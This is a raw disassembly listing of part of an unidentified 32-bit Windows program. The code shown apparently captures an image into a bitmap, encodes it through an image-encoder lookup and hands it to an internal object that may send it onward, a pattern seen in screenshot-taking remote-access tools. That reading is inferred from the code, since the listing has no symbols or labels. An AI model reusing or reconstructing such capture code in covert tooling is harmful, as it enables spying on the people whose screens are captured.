  4095ba:	ff 15 d0 d3 40 00    	call   *0x40d3d0
  4095c0:	85 c0                	test   %eax,%eax
  4095c2:	74 24                	je     0x4095e8
  4095c4:	ff 75 a8             	push   -0x58(%ebp)
  4095c7:	ff d7                	call   *%edi
  4095c9:	ff 75 a4             	push   -0x5c(%ebp)
  4095cc:	ff d7                	call   *%edi
  4095ce:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4095d1:	ff 75 b4             	push   -0x4c(%ebp)
  4095d4:	2b 45 a0             	sub    -0x60(%ebp),%eax
  4095d7:	50                   	push   %eax
  4095d8:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4095db:	2b 45 9c             	sub    -0x64(%ebp),%eax
  4095de:	50                   	push   %eax
  4095df:	ff 75 fc             	push   -0x4(%ebp)
  4095e2:	ff 15 d4 d3 40 00    	call   *0x40d3d4
  4095e8:	8d 45 80             	lea    -0x80(%ebp),%eax
  4095eb:	50                   	push   %eax
  4095ec:	6a 18                	push   $0x18
  4095ee:	5e                   	pop    %esi
  4095ef:	56                   	push   %esi
  4095f0:	ff 75 f8             	push   -0x8(%ebp)
  4095f3:	ff 15 80 d0 40 00    	call   *0x40d080
  4095f9:	85 c0                	test   %eax,%eax
  4095fb:	75 1d                	jne    0x40961a
  4095fd:	ff 75 f4             	push   -0xc(%ebp)
  409600:	8b 1d 90 d0 40 00    	mov    0x40d090,%ebx
  409606:	ff d3                	call   *%ebx
  409608:	ff 75 fc             	push   -0x4(%ebp)
  40960b:	ff d3                	call   *%ebx
  40960d:	ff 75 f8             	push   -0x8(%ebp)
  409610:	ff d7                	call   *%edi
  409612:	8d 45 0f             	lea    0xf(%ebp),%eax
  409615:	e9 1e 01 00 00       	jmp    0x409738
  40961a:	8b 45 92             	mov    -0x6e(%ebp),%eax
  40961d:	6a 01                	push   $0x1
  40961f:	0f af 45 90          	imul   -0x70(%ebp),%eax
  409623:	5a                   	pop    %edx
  409624:	66 3b c2             	cmp    %dx,%ax
  409627:	75 08                	jne    0x409631
  409629:	89 55 0c             	mov    %edx,0xc(%ebp)
  40962c:	e9 bb 00 00 00       	jmp    0x4096ec
  409631:	6a 04                	push   $0x4
  409633:	59                   	pop    %ecx
  409634:	66 3b c1             	cmp    %cx,%ax
  409637:	77 08                	ja     0x409641
  409639:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40963c:	e9 ab 00 00 00       	jmp    0x4096ec
  409641:	6a 08                	push   $0x8
  409643:	59                   	pop    %ecx
  409644:	66 3b c1             	cmp    %cx,%ax
  409647:	76 f0                	jbe    0x409639
  409649:	6a 10                	push   $0x10
  40964b:	59                   	pop    %ecx
  40964c:	66 3b c1             	cmp    %cx,%ax
  40964f:	76 e8                	jbe    0x409639
  409651:	66 3b c6             	cmp    %si,%ax
  409654:	0f 87 8b 00 00 00    	ja     0x4096e5
  40965a:	89 75 0c             	mov    %esi,0xc(%ebp)
  40965d:	6a 28                	push   $0x28
  40965f:	6a 40                	push   $0x40
  409661:	ff 15 dc d0 40 00    	call   *0x40d0dc
  409667:	8b f0                	mov    %eax,%esi
  409669:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40966c:	66 83 f9 18          	cmp    $0x18,%cx
  409670:	c7 06 28 00 00 00    	movl   $0x28,(%esi)
  409676:	8b 45 84             	mov    -0x7c(%ebp),%eax
  409679:	89 46 04             	mov    %eax,0x4(%esi)
  40967c:	8b 45 88             	mov    -0x78(%ebp),%eax
  40967f:	89 46 08             	mov    %eax,0x8(%esi)
  409682:	66 8b 45 90          	mov    -0x70(%ebp),%ax
  409686:	66 89 46 0c          	mov    %ax,0xc(%esi)
  40968a:	66 8b 45 92          	mov    -0x6e(%ebp),%ax
  40968e:	66 89 46 0e          	mov    %ax,0xe(%esi)
  409692:	73 08                	jae    0x40969c
  409694:	6a 01                	push   $0x1
  409696:	58                   	pop    %eax
  409697:	d3 e0                	shl    %cl,%eax
  409699:	89 46 20             	mov    %eax,0x20(%esi)
  40969c:	8b 46 04             	mov    0x4(%esi),%eax
  40969f:	6a 08                	push   $0x8
  4096a1:	83 c0 07             	add    $0x7,%eax
  4096a4:	59                   	pop    %ecx
  4096a5:	99                   	cltd
  4096a6:	f7 f9                	idiv   %ecx
  4096a8:	0f b7 4d 0c          	movzwl 0xc(%ebp),%ecx
  4096ac:	89 5e 10             	mov    %ebx,0x10(%esi)
  4096af:	89 5e 24             	mov    %ebx,0x24(%esi)
  4096b2:	0f af c1             	imul   %ecx,%eax
  4096b5:	0f af 46 08          	imul   0x8(%esi),%eax
  4096b9:	50                   	push   %eax
  4096ba:	53                   	push   %ebx
  4096bb:	89 46 14             	mov    %eax,0x14(%esi)
  4096be:	ff 15 c8 d0 40 00    	call   *0x40d0c8
  4096c4:	3b c3                	cmp    %ebx,%eax
  4096c6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4096c9:	75 33                	jne    0x4096fe
  4096cb:	ff 75 f4             	push   -0xc(%ebp)
  4096ce:	8b 35 90 d0 40 00    	mov    0x40d090,%esi
  4096d4:	ff d6                	call   *%esi
  4096d6:	ff 75 fc             	push   -0x4(%ebp)
  4096d9:	ff d6                	call   *%esi
  4096db:	ff 75 f8             	push   -0x8(%ebp)
  4096de:	ff d7                	call   *%edi
  4096e0:	8d 45 0f             	lea    0xf(%ebp),%eax
  4096e3:	eb 53                	jmp    0x409738
  4096e5:	c7 45 0c 20 00 00 00 	movl   $0x20,0xc(%ebp)
  4096ec:	8a 4d 0c             	mov    0xc(%ebp),%cl
  4096ef:	d3 e2                	shl    %cl,%edx
  4096f1:	8d 04 95 28 00 00 00 	lea    0x28(,%edx,4),%eax
  4096f8:	50                   	push   %eax
  4096f9:	e9 61 ff ff ff       	jmp    0x40965f
  4096fe:	53                   	push   %ebx
  4096ff:	56                   	push   %esi
  409700:	50                   	push   %eax
  409701:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  409705:	50                   	push   %eax
  409706:	53                   	push   %ebx
  409707:	ff 75 f8             	push   -0x8(%ebp)
  40970a:	ff 75 fc             	push   -0x4(%ebp)
  40970d:	ff 15 7c d0 40 00    	call   *0x40d07c
  409713:	85 c0                	test   %eax,%eax
  409715:	75 35                	jne    0x40974c
  409717:	ff 75 f4             	push   -0xc(%ebp)
  40971a:	8b 35 90 d0 40 00    	mov    0x40d090,%esi
  409720:	ff d6                	call   *%esi
  409722:	ff 75 fc             	push   -0x4(%ebp)
  409725:	ff d6                	call   *%esi
  409727:	ff 75 f8             	push   -0x8(%ebp)
  40972a:	ff d7                	call   *%edi
  40972c:	ff 75 f0             	push   -0x10(%ebp)
  40972f:	ff 15 a8 d1 40 00    	call   *0x40d1a8
  409735:	8d 45 0f             	lea    0xf(%ebp),%eax
  409738:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40973b:	50                   	push   %eax
  40973c:	68 a0 d4 40 00       	push   $0x40d4a0
  409741:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  409747:	e9 d4 00 00 00       	jmp    0x409820
  40974c:	66 c7 45 e0 42 4d    	movw   $0x4d42,-0x20(%ebp)
  409752:	8b 46 20             	mov    0x20(%esi),%eax
  409755:	8b 4e 14             	mov    0x14(%esi),%ecx
  409758:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40975b:	8b 0e                	mov    (%esi),%ecx
  40975d:	66 89 5d e6          	mov    %bx,-0x1a(%ebp)
  409761:	66 89 5d e8          	mov    %bx,-0x18(%ebp)
  409765:	8d 44 08 0e          	lea    0xe(%eax,%ecx,1),%eax
  409769:	89 45 e2             	mov    %eax,-0x1e(%ebp)
  40976c:	8b 46 20             	mov    0x20(%esi),%eax
  40976f:	8b 0e                	mov    (%esi),%ecx
  409771:	8d 44 81 0e          	lea    0xe(%ecx,%eax,4),%eax
  409775:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  409778:	89 45 ea             	mov    %eax,-0x16(%ebp)
  40977b:	8d 45 0f             	lea    0xf(%ebp),%eax
  40977e:	50                   	push   %eax
  40977f:	ff 15 dc d2 40 00    	call   *0x40d2dc
  409785:	8d 45 0f             	lea    0xf(%ebp),%eax
  409788:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40978b:	50                   	push   %eax
  40978c:	ff 15 dc d2 40 00    	call   *0x40d2dc
  409792:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409795:	6a 0e                	push   $0xe
  409797:	50                   	push   %eax
  409798:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40979b:	ff 15 e8 d1 40 00    	call   *0x40d1e8
  4097a1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4097a4:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4097a7:	50                   	push   %eax
  4097a8:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4097ae:	6a 28                	push   $0x28
  4097b0:	56                   	push   %esi
  4097b1:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4097b4:	ff 15 e8 d1 40 00    	call   *0x40d1e8
  4097ba:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4097bd:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4097c0:	50                   	push   %eax
  4097c1:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4097c7:	ff 76 14             	push   0x14(%esi)
  4097ca:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4097cd:	ff 75 f0             	push   -0x10(%ebp)
  4097d0:	ff 15 e8 d1 40 00    	call   *0x40d1e8
  4097d6:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4097d9:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4097dc:	50                   	push   %eax
  4097dd:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4097e3:	ff 75 f8             	push   -0x8(%ebp)
  4097e6:	ff d7                	call   *%edi
  4097e8:	ff 75 f0             	push   -0x10(%ebp)
  4097eb:	ff 15 a8 d1 40 00    	call   *0x40d1a8
  4097f1:	ff 75 f4             	push   -0xc(%ebp)
  4097f4:	8b 35 90 d0 40 00    	mov    0x40d090,%esi
  4097fa:	ff d6                	call   *%esi
  4097fc:	ff 75 fc             	push   -0x4(%ebp)
  4097ff:	ff d6                	call   *%esi
  409801:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409804:	8d 45 c0             	lea    -0x40(%ebp),%eax
  409807:	50                   	push   %eax
  409808:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40980e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  409811:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409817:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40981a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409820:	8b 45 08             	mov    0x8(%ebp),%eax
  409823:	5f                   	pop    %edi
  409824:	5e                   	pop    %esi
  409825:	5b                   	pop    %ebx
  409826:	c9                   	leave
  409827:	c3                   	ret
  409828:	55                   	push   %ebp
  409829:	8b ec                	mov    %esp,%ebp
  40982b:	83 ec 0c             	sub    $0xc,%esp
  40982e:	53                   	push   %ebx
  40982f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409832:	56                   	push   %esi
  409833:	50                   	push   %eax
  409834:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409837:	33 f6                	xor    %esi,%esi
  409839:	50                   	push   %eax
  40983a:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40983d:	89 75 f8             	mov    %esi,-0x8(%ebp)
  409840:	e8 7c 00 00 00       	call   0x4098c1
  409845:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  409848:	59                   	pop    %ecx
  409849:	59                   	pop    %ecx
  40984a:	74 10                	je     0x40985c
  40984c:	ff 75 f8             	push   -0x8(%ebp)
  40984f:	ff 15 7c d3 40 00    	call   *0x40d37c
  409855:	8b d8                	mov    %eax,%ebx
  409857:	59                   	pop    %ecx
  409858:	3b de                	cmp    %esi,%ebx
  40985a:	75 05                	jne    0x409861
  40985c:	83 c8 ff             	or     $0xffffffff,%eax
  40985f:	eb 46                	jmp    0x4098a7
  409861:	53                   	push   %ebx
  409862:	ff 75 f8             	push   -0x8(%ebp)
  409865:	ff 75 f4             	push   -0xc(%ebp)
  409868:	e8 64 00 00 00       	call   0x4098d1
  40986d:	83 c4 0c             	add    $0xc,%esp
  409870:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  409873:	89 75 fc             	mov    %esi,-0x4(%ebp)
  409876:	76 22                	jbe    0x40989a
  409878:	8d 73 30             	lea    0x30(%ebx),%esi
  40987b:	ff 75 08             	push   0x8(%ebp)
  40987e:	ff 36                	push   (%esi)
  409880:	ff 15 54 d3 40 00    	call   *0x40d354
  409886:	59                   	pop    %ecx
  409887:	85 c0                	test   %eax,%eax
  409889:	59                   	pop    %ecx
  40988a:	74 1f                	je     0x4098ab
  40988c:	ff 45 fc             	incl   -0x4(%ebp)
  40988f:	83 c6 4c             	add    $0x4c,%esi
  409892:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409895:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  409898:	72 e1                	jb     0x40987b
  40989a:	83 ce ff             	or     $0xffffffff,%esi
  40989d:	53                   	push   %ebx
  40989e:	ff 15 80 d3 40 00    	call   *0x40d380
  4098a4:	59                   	pop    %ecx
  4098a5:	8b c6                	mov    %esi,%eax
  4098a7:	5e                   	pop    %esi
  4098a8:	5b                   	pop    %ebx
  4098a9:	c9                   	leave
  4098aa:	c3                   	ret
  4098ab:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4098ae:	57                   	push   %edi
  4098af:	6b f6 4c             	imul   $0x4c,%esi,%esi
  4098b2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4098b5:	03 f3                	add    %ebx,%esi
  4098b7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4098b8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4098b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4098ba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4098bb:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4098be:	5f                   	pop    %edi
  4098bf:	eb dc                	jmp    0x40989d
  4098c1:	55                   	push   %ebp
  4098c2:	8b ec                	mov    %esp,%ebp
  4098c4:	ff 75 0c             	push   0xc(%ebp)
  4098c7:	ff 75 08             	push   0x8(%ebp)
  4098ca:	e8 4f 2e 00 00       	call   0x40c71e
  4098cf:	5d                   	pop    %ebp
  4098d0:	c3                   	ret
  4098d1:	55                   	push   %ebp
  4098d2:	8b ec                	mov    %esp,%ebp
  4098d4:	ff 75 10             	push   0x10(%ebp)
  4098d7:	ff 75 0c             	push   0xc(%ebp)
  4098da:	ff 75 08             	push   0x8(%ebp)
  4098dd:	e8 42 2e 00 00       	call   0x40c724
  4098e2:	5d                   	pop    %ebp
  4098e3:	c3                   	ret
  4098e4:	55                   	push   %ebp
  4098e5:	8b ec                	mov    %esp,%ebp
  4098e7:	81 ec e8 00 00 00    	sub    $0xe8,%esp
  4098ed:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  4098f1:	53                   	push   %ebx
  4098f2:	33 db                	xor    %ebx,%ebx
  4098f4:	39 1d 04 1c 41 00    	cmp    %ebx,0x411c04
  4098fa:	56                   	push   %esi
  4098fb:	57                   	push   %edi
  4098fc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4098ff:	75 1a                	jne    0x40991b
  409901:	53                   	push   %ebx
  409902:	53                   	push   %ebx
  409903:	53                   	push   %ebx
  409904:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  409907:	e8 8b 02 00 00       	call   0x409b97
  40990c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40990f:	53                   	push   %ebx
  409910:	50                   	push   %eax
  409911:	68 04 1c 41 00       	push   $0x411c04
  409916:	e8 0f 2e 00 00       	call   0x40c72a
  40991b:	39 1d 00 1c 41 00    	cmp    %ebx,0x411c00
  409921:	75 19                	jne    0x40993c
  409923:	6a 0c                	push   $0xc
  409925:	68 d0 dc 40 00       	push   $0x40dcd0
  40992a:	ff 15 24 d1 40 00    	call   *0x40d124
  409930:	50                   	push   %eax
  409931:	ff 15 28 d1 40 00    	call   *0x40d128
  409937:	a3 00 1c 41 00       	mov    %eax,0x411c00
  40993c:	ff 75 0c             	push   0xc(%ebp)
  40993f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409942:	50                   	push   %eax
  409943:	e8 71 fb ff ff       	call   0x4094b9
  409948:	59                   	pop    %ecx
  409949:	59                   	pop    %ecx
  40994a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40994d:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  409953:	85 c0                	test   %eax,%eax
  409955:	75 47                	jne    0x40999e
  409957:	39 1d 10 1c 41 00    	cmp    %ebx,0x411c10
  40995d:	bb 10 1c 41 00       	mov    $0x411c10,%ebx
  409962:	75 1c                	jne    0x409980
  409964:	8b cb                	mov    %ebx,%ecx
  409966:	e8 35 77 ff ff       	call   0x4010a0
  40996b:	83 ec 10             	sub    $0x10,%esp
  40996e:	be 78 11 41 00       	mov    $0x411178,%esi
  409973:	8b fc                	mov    %esp,%edi
  409975:	8b cb                	mov    %ebx,%ecx
  409977:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409978:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409979:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40997a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40997b:	e8 83 77 ff ff       	call   0x401103
  409980:	83 ec 10             	sub    $0x10,%esp
  409983:	8b cc                	mov    %esp,%ecx
  409985:	68 b0 1c 41 00       	push   $0x411cb0
  40998a:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  409990:	6a 4e                	push   $0x4e
  409992:	8b cb                	mov    %ebx,%ecx
  409994:	e8 91 77 ff ff       	call   0x40112a
  409999:	e9 eb 01 00 00       	jmp    0x409b89
  40999e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4099a1:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4099a7:	50                   	push   %eax
  4099a8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4099ab:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4099b1:	50                   	push   %eax
  4099b2:	ff 15 00 1c 41 00    	call   *0x411c00
  4099b8:	53                   	push   %ebx
  4099b9:	50                   	push   %eax
  4099ba:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4099bd:	89 45 0c             	mov    %eax,0xc(%ebp)
  4099c0:	e8 f3 01 00 00       	call   0x409bb8
  4099c5:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4099cb:	50                   	push   %eax
  4099cc:	68 14 de 40 00       	push   $0x40de14
  4099d1:	e8 52 fe ff ff       	call   0x409828
  4099d6:	59                   	pop    %ecx
  4099d7:	be 24 e0 40 00       	mov    $0x40e024,%esi
  4099dc:	59                   	pop    %ecx
  4099dd:	8d 7d 84             	lea    -0x7c(%ebp),%edi
  4099e0:	6a 01                	push   $0x1
  4099e2:	58                   	pop    %eax
  4099e3:	89 45 80             	mov    %eax,-0x80(%ebp)
  4099e6:	53                   	push   %ebx
  4099e7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4099e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4099e9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4099ea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4099eb:	89 45 94             	mov    %eax,-0x6c(%ebp)
  4099ee:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4099f1:	53                   	push   %ebx
  4099f2:	c7 45 98 04 00 00 00 	movl   $0x4,-0x68(%ebp)
  4099f9:	89 45 9c             	mov    %eax,-0x64(%ebp)
  4099fc:	ff 15 00 1c 41 00    	call   *0x411c00
  409a02:	8b f0                	mov    %eax,%esi
  409a04:	8d 45 80             	lea    -0x80(%ebp),%eax
  409a07:	50                   	push   %eax
  409a08:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  409a0e:	50                   	push   %eax
  409a0f:	56                   	push   %esi
  409a10:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  409a13:	e8 6f 02 00 00       	call   0x409c87
  409a18:	8b 06                	mov    (%esi),%eax
  409a1a:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  409a20:	6a 01                	push   $0x1
  409a22:	51                   	push   %ecx
  409a23:	56                   	push   %esi
  409a24:	ff 50 30             	call   *0x30(%eax)
  409a27:	8d 45 0b             	lea    0xb(%ebp),%eax
  409a2a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409a2d:	50                   	push   %eax
  409a2e:	53                   	push   %ebx
  409a2f:	ff b5 20 ff ff ff    	push   -0xe0(%ebp)
  409a35:	ff 15 ec d1 40 00    	call   *0x40d1ec
  409a3b:	8b 0e                	mov    (%esi),%ecx
  409a3d:	53                   	push   %ebx
  409a3e:	33 c0                	xor    %eax,%eax
  409a40:	53                   	push   %ebx
  409a41:	53                   	push   %ebx
  409a42:	50                   	push   %eax
  409a43:	56                   	push   %esi
  409a44:	ff 51 14             	call   *0x14(%ecx)
  409a47:	8b 3e                	mov    (%esi),%edi
  409a49:	53                   	push   %ebx
  409a4a:	ff b5 20 ff ff ff    	push   -0xe0(%ebp)
  409a50:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409a53:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  409a59:	50                   	push   %eax
  409a5a:	56                   	push   %esi
  409a5b:	ff 57 0c             	call   *0xc(%edi)
  409a5e:	8b 45 0c             	mov    0xc(%ebp),%eax
  409a61:	50                   	push   %eax
  409a62:	8b 08                	mov    (%eax),%ecx
  409a64:	ff 51 08             	call   *0x8(%ecx)
  409a67:	8b 06                	mov    (%esi),%eax
  409a69:	56                   	push   %esi
  409a6a:	ff 50 08             	call   *0x8(%eax)
  409a6d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  409a70:	6a 0a                	push   $0xa
  409a72:	50                   	push   %eax
  409a73:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409a76:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  409a7c:	50                   	push   %eax
  409a7d:	ff 15 88 d3 40 00    	call   *0x40d388
  409a83:	83 c4 0c             	add    $0xc,%esp
  409a86:	80 3d fd 1c 41 00 01 	cmpb   $0x1,0x411cfd
  409a8d:	0f 84 e5 00 00 00    	je     0x409b78
  409a93:	39 1d 10 1c 41 00    	cmp    %ebx,0x411c10
  409a99:	0f 85 9c 00 00 00    	jne    0x409b3b
  409a9f:	bb 10 1c 41 00       	mov    $0x411c10,%ebx
  409aa4:	8b cb                	mov    %ebx,%ecx
  409aa6:	e8 f5 75 ff ff       	call   0x4010a0
  409aab:	83 ec 10             	sub    $0x10,%esp
  409aae:	be 78 11 41 00       	mov    $0x411178,%esi
  409ab3:	8b fc                	mov    %esp,%edi
  409ab5:	8b cb                	mov    %ebx,%ecx
  409ab7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409ab8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409ab9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409aba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409abb:	e8 43 76 ff ff       	call   0x401103
  409ac0:	68 d9 9c 40 00       	push   $0x409cd9
  409ac5:	8b cb                	mov    %ebx,%ecx
  409ac7:	e8 b4 76 ff ff       	call   0x401180
  409acc:	83 ec 10             	sub    $0x10,%esp
  409acf:	b8 68 11 41 00       	mov    $0x411168,%eax
  409ad4:	8b f4                	mov    %esp,%esi
  409ad6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409ad9:	68 b0 1c 41 00       	push   $0x411cb0
  409ade:	50                   	push   %eax
  409adf:	51                   	push   %ecx
  409ae0:	50                   	push   %eax
  409ae1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  409ae4:	50                   	push   %eax
  409ae5:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409ae8:	50                   	push   %eax
  409ae9:	e8 d6 2b 00 00       	call   0x40c6c4
  409aee:	83 c4 0c             	add    $0xc,%esp
  409af1:	50                   	push   %eax
  409af2:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  409af8:	50                   	push   %eax
  409af9:	e8 ba 2b 00 00       	call   0x40c6b8
  409afe:	83 c4 0c             	add    $0xc,%esp
  409b01:	50                   	push   %eax
  409b02:	8d 45 c0             	lea    -0x40(%ebp),%eax
  409b05:	50                   	push   %eax
  409b06:	e8 ad 2b 00 00       	call   0x40c6b8
  409b0b:	83 c4 0c             	add    $0xc,%esp
  409b0e:	50                   	push   %eax
  409b0f:	56                   	push   %esi
  409b10:	e8 a3 2b 00 00       	call   0x40c6b8
  409b15:	83 c4 0c             	add    $0xc,%esp
  409b18:	8b cb                	mov    %ebx,%ecx
  409b1a:	6a 10                	push   $0x10
  409b1c:	e8 09 76 ff ff       	call   0x40112a
  409b21:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  409b24:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409b2a:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  409b30:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409b36:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  409b39:	eb 37                	jmp    0x409b72
  409b3b:	83 ec 10             	sub    $0x10,%esp
  409b3e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409b41:	8b f4                	mov    %esp,%esi
  409b43:	50                   	push   %eax
  409b44:	8d 45 d0             	lea    -0x30(%ebp),%eax
  409b47:	68 68 11 41 00       	push   $0x411168
  409b4c:	50                   	push   %eax
  409b4d:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409b50:	50                   	push   %eax
  409b51:	e8 6e 2b 00 00       	call   0x40c6c4
  409b56:	83 c4 0c             	add    $0xc,%esp
  409b59:	50                   	push   %eax
  409b5a:	56                   	push   %esi
  409b5b:	e8 58 2b 00 00       	call   0x40c6b8
  409b60:	83 c4 0c             	add    $0xc,%esp
  409b63:	b9 10 1c 41 00       	mov    $0x411c10,%ecx
  409b68:	6a 4d                	push   $0x4d
  409b6a:	e8 bb 75 ff ff       	call   0x40112a
  409b6f:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  409b72:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409b78:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409b7b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409b81:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  409b84:	e8 8e 00 00 00       	call   0x409c17
  409b89:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b8c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409b92:	5f                   	pop    %edi
  409b93:	5e                   	pop    %esi
  409b94:	5b                   	pop    %ebx
  409b95:	c9                   	leave
  409b96:	c3                   	ret
  409b97:	55                   	push   %ebp
  409b98:	8b ec                	mov    %esp,%ebp
  409b9a:	8b c1                	mov    %ecx,%eax
  409b9c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409b9f:	89 48 04             	mov    %ecx,0x4(%eax)
  409ba2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409ba5:	89 48 08             	mov    %ecx,0x8(%eax)
  409ba8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409bab:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  409bb1:	89 48 0c             	mov    %ecx,0xc(%eax)
  409bb4:	5d                   	pop    %ebp
  409bb5:	c2 0c 00             	ret    $0xc
  409bb8:	55                   	push   %ebp
  409bb9:	8b ec                	mov    %esp,%ebp
  409bbb:	56                   	push   %esi
  409bbc:	8b f1                	mov    %ecx,%esi
  409bbe:	83 66 04 00          	andl   $0x0,0x4(%esi)
  409bc2:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  409bc6:	8d 46 04             	lea    0x4(%esi),%eax
  409bc9:	c7 06 2c de 40 00    	movl   $0x40de2c,(%esi)
  409bcf:	50                   	push   %eax
  409bd0:	ff 75 08             	push   0x8(%ebp)
  409bd3:	74 07                	je     0x409bdc
  409bd5:	e8 5c 2b 00 00       	call   0x40c736
  409bda:	eb 05                	jmp    0x409be1
  409bdc:	e8 4f 2b 00 00       	call   0x40c730
  409be1:	89 46 08             	mov    %eax,0x8(%esi)
  409be4:	8b c6                	mov    %esi,%eax
  409be6:	5e                   	pop    %esi
  409be7:	5d                   	pop    %ebp
  409be8:	c2 08 00             	ret    $0x8
  409beb:	55                   	push   %ebp
  409bec:	8b ec                	mov    %esp,%ebp
  409bee:	56                   	push   %esi
  409bef:	8b f1                	mov    %ecx,%esi
  409bf1:	e8 21 00 00 00       	call   0x409c17
  409bf6:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  409bfa:	74 07                	je     0x409c03
  409bfc:	56                   	push   %esi
  409bfd:	e8 08 00 00 00       	call   0x409c0a
  409c02:	59                   	pop    %ecx
  409c03:	8b c6                	mov    %esi,%eax
  409c05:	5e                   	pop    %esi
  409c06:	5d                   	pop    %ebp
  409c07:	c2 04 00             	ret    $0x4
  409c0a:	55                   	push   %ebp
  409c0b:	8b ec                	mov    %esp,%ebp
  409c0d:	ff 75 08             	push   0x8(%ebp)
  409c10:	e8 27 2b 00 00       	call   0x40c73c
  409c15:	5d                   	pop    %ebp
  409c16:	c3                   	ret
  409c17:	ff 71 04             	push   0x4(%ecx)
  409c1a:	c7 01 2c de 40 00    	movl   $0x40de2c,(%ecx)
  409c20:	e8 1d 2b 00 00       	call   0x40c742
  409c25:	c3                   	ret
  409c26:	55                   	push   %ebp
  409c27:	8b ec                	mov    %esp,%ebp
  409c29:	51                   	push   %ecx
